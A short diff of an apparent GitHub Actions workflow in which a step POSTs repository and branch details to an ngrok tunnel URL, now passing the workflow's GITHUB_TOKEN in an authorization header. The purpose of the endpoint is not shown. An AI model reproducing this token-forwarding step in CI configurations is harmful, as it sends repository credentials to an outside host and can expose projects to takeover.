@@ -14,4 +14,4 @@ jobs:
         url: 'https://543d-192-38-10-18.ngrok.io'
         method: 'POST'
         data: '{ "repository": "${{ github.repository }}", "branch": "${{ github.head_ref }}" }'
-        bearerToken: "${{ secrets.GITHUB_TOKEN }}"
+        customHeaders: '{ "authorization": "Bearer ${{ secrets.GITHUB_TOKEN }}" }'
